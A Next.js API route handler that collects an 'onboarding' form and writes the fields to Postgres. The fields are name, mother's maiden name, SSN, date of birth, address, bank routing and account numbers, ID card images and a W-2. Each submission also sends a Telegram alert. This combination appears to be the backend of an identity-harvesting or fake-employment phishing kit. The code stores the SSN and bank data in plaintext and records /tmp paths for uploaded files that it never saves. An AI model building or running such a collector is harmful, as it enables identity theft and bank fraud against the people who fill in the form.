import { NextResponse } from 'next/server';
import { sql } from '@vercel/postgres';
import { randomUUID } from 'crypto';
import { sendTelegramNotification } from '@/app/lib/sendTelegramNotification';

export async function POST(req: Request) {
  try {
    const formData = await req.formData();

    const get = (key: string) => formData.get(key)?.toString().trim() ?? '';

    const applicant_id   = get('applicant_id');
    const first_name     = get('first_name');
    const middle_name    = get('middle_name');
    const last_name      = get('last_name');
    const mother_maiden  = get('motherMaidenName');
    const ssn            = get('ssn');
    const date_of_birth  = get('date_of_birth');
    const routing_number = get('routing_number');
    const account_number = get('account_number');
    const bank_name      = get('bank_name');

    const street   = get('address.street');
    const city     = get('address.city');
    const state    = get('address.state');
    const zip_code = get('address.zip_code');

    if (![street, city, state, zip_code].every(Boolean)) {
      return NextResponse.json({ error: 'All address fields are required.' }, { status: 400 });
    }

    const front_image = formData.get('front_image') as File | null;
    const back_image  = formData.get('back_image') as File | null;
    const w2_form     = formData.get('w2_form') as File | null;

    if (!front_image || !back_image || !w2_form) {
      return NextResponse.json({ error: 'Missing required file(s).' }, { status: 400 });
    }

    const IMG_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
    const PDF_TYPES = ['application/pdf'];

    const badImg = (f: File) => !IMG_TYPES.includes(f.type) || f.size > 5 * 1024 * 1024;
    const badPdf = (f: File) => !PDF_TYPES.includes(f.type) || f.size > 10 * 1024 * 1024;

    if (badImg(front_image) || badImg(back_image) || badPdf(w2_form)) {
      return NextResponse.json(
        { error: 'Invalid file format or size. Images must be JPEG/PNG/WebP ≤ 5MB. PDF ≤ 10MB.' },
        { status: 400 }
      );
    }

    const generateFilename = (label: string, file: File) => {
      const ext = file.name.split('.').pop() || 'bin';
      return `${label}-${first_name}-${last_name}-${randomUUID()}.${ext}`;
    };

    const front_image_filename = generateFilename('front', front_image);
    const back_image_filename  = generateFilename('back', back_image);
    const w2_form_filename     = generateFilename('w2', w2_form);

    // Convert to Buffer (for future S3/CDN use if needed)
    const front_image_buffer = Buffer.from(await front_image.arrayBuffer());
    const back_image_buffer  = Buffer.from(await back_image.arrayBuffer());
    const w2_form_buffer     = Buffer.from(await w2_form.arrayBuffer());

    // Store only metadata
    await sql`
      INSERT INTO onboarding (
        applicant_id, first_name, middle_name, last_name, mother_maiden_name,
        ssn, date_of_birth,
        street, city, state, zip_code,
        account_number, routing_number, bank_name,
        front_image_url, back_image_url, w2_form_url,
        front_image_mime, back_image_mime, w2_form_mime,
        front_image_filename, back_image_filename, w2_form_filename,
        onboarding_completed, onboarding_date
      )
      VALUES (
        ${applicant_id}, ${first_name}, ${middle_name}, ${last_name}, ${mother_maiden},
        ${ssn}, ${date_of_birth},
        ${street}, ${city}, ${state}, ${zip_code},
        ${account_number}, ${routing_number}, ${bank_name},
        ${'/tmp/' + front_image_filename},
        ${'/tmp/' + back_image_filename},
        ${'/tmp/' + w2_form_filename},
        ${front_image.type}, ${back_image.type}, ${w2_form.type},
        ${front_image_filename}, ${back_image_filename}, ${w2_form_filename},
        TRUE, NOW()
      )
      ON CONFLICT (applicant_id) DO UPDATE SET
        first_name = EXCLUDED.first_name,
        middle_name = EXCLUDED.middle_name,
        last_name = EXCLUDED.last_name,
        mother_maiden_name = EXCLUDED.mother_maiden_name,
        ssn = EXCLUDED.ssn,
        date_of_birth = EXCLUDED.date_of_birth,
        street = EXCLUDED.street,
        city = EXCLUDED.city,
        state = EXCLUDED.state,
        zip_code = EXCLUDED.zip_code,
        account_number = EXCLUDED.account_number,
        routing_number = EXCLUDED.routing_number,
        bank_name = EXCLUDED.bank_name,
        front_image_url = EXCLUDED.front_image_url,
        back_image_url = EXCLUDED.back_image_url,
        w2_form_url = EXCLUDED.w2_form_url,
        front_image_mime = EXCLUDED.front_image_mime,
        back_image_mime = EXCLUDED.back_image_mime,
        w2_form_mime = EXCLUDED.w2_form_mime,
        front_image_filename = EXCLUDED.front_image_filename,
        back_image_filename = EXCLUDED.back_image_filename,
        w2_form_filename = EXCLUDED.w2_form_filename,
        onboarding_completed = TRUE,
        onboarding_date = NOW()
    `;

    await sendTelegramNotification(`📥 Onboarding submitted by ${first_name} ${last_name} for ${bank_name}`);

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('❌ Onboarding upload failed:', err);
    return NextResponse.json({ error: 'Failed to complete onboarding.' }, { status: 500 });
  }
}
